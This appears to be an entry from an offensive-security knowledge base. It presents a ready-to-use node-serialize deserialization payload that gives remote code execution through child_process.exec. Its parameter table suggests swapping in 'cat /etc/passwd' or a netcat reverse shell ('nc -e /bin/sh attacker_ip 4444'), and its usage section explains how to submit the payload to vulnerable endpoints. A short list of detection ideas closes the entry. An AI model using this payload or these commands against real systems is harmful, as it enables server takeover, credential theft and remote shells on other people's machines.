---
id: 4d4bf47e-5aee-439d-ac1b-cbeecc1f75da
type: code
name: Malicious-Node-Serialize-Deserialization-Payload
language: js
verified: true
created_at: '2023-04-06T03:55:59.259055+00:00'
updated_at: '2023-04-06T03:55:59.262214+00:00'
tags:
  - rce
  - deserialization
  - payload
  - node-serialize
platforms:
  - Node.js
validated: true
---

# Malicious-Node-Serialize-Deserialization-Payload

## Code

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

## Description

This is a modified serialized JavaScript string designed for exploitation via node-serialize deserialization. It embeds a function marked with '_$$ND_FUNC$$_' that executes a system command ('ls /' by default) using child_process.exec. The trailing '()' forces immediate execution upon deserialization, leading to RCE on the target server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `$COMMAND` | System command inside the exec (replace 'ls /') | `cat /etc/passwd` or `nc -e /bin/sh attacker_ip 4444` |

## Usage

This payload string is the final form to submit to a vulnerable deserialization endpoint (e.g., via POST request body or query parameter). Generate it by modifying the output from [[codes/Generate-Node-Serialize-RCE-Payload]] or directly customize and send using tools like curl. Used in procedures like [[procedures/Node-Deserialization-RCE-using-node-serialize]] for targeting Node.js apps with unsafe deserialization.

## Detection

- WAF rules to block JSON payloads containing '_$$ND_FUNC$$_' or function definitions.
- Runtime monitoring for deserialization of executable code in Node.js processes.
- Audit logs for child_process spawns from web application contexts.
- Behavioral analysis: unexpected file listings or command outputs in app responses.

## Related

- [[procedures/Node-Deserialization-RCE-using-node-serialize]]
- [[tools/node-serialize]]
